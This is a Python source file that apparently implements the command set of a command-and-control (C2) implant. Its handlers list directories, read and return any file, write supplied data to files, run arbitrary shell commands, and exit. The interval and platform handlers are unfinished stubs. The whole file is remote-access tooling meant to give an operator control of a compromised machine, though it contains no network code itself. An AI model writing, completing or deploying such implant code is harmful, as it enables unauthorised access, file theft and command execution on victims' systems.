
from enum import Enum
import os
import subprocess

class commands(Enum):
    """
    Listing of possible c2 commands
    """
    DIR = 1
    GET = 2
    PUT = 3
    EXEC = 4
    DIE = 5
    INTERVAL = 6
    PLATFORM = 7
    PLATFORMS = 8

    @staticmethod
    def do_dir(dir):
        """
        Return the contents of a directory
        """
        proc = subprocess.run(["ls", "-l", dir], capture_output=True)
        result = b""
        if proc.returncode != 0:
            result = proc.stderr
        else:
            result = proc.stdout

        return result

    @staticmethod
    def do_get(filename):
        """
        Return the contents of 'file'
        """
        try:
            f = open(filename, "rb")
            result = f.read()
            f.close()
        except:
            result = b"File failed to open and read"

        return result

    @staticmethod
    def do_put(filename, data):
        """
        Create a file, with data
        """
        # TODO: Binary mode may or may not be good
        try:
            f = open(filename, "w")
            f.write(data)
            f.close()
            result = b"File successfully written"
        except:
            result = b"File failed to open or write"

        return result

    @staticmethod
    def do_exec(*argv):
        """
        Return an arbitrary shell command
        """
        proc = subprocess.run(argv[:], capture_output=True)
        result = b""
        if proc.returncode != 0:
            result = proc.stderr
        else:
            result = proc.stdout

        return result

    @staticmethod
    def do_die():
        """
        Return a string verifying exit
        """
        return "Exiting"

    @staticmethod
    def do_interval():
        # TODO: Figure out how to update interval from this class
        pass

    @staticmethod
    def do_platform():
        # TODO: Figure out how to update platform from this class
        pass
    
    @staticmethod
    def do_platforms():
        # TODO: Figure out how to print platforms from this class
        # TODO: Also print current platform
        pass
